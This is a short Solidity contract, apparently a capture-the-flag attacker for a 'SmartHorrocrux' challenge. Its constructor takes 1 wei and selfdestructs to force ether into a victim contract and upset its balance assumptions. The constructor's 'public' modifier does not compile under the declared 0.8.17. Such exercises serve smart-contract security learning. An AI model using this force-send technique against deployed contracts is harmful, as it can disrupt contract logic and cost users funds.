// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract SmartHorrocruxAttacker {
    constructor(address _victim) public payable {
        require(msg.value == 1, "Send 1 plz");
        selfdestruct(payable(_victim));
    }
}
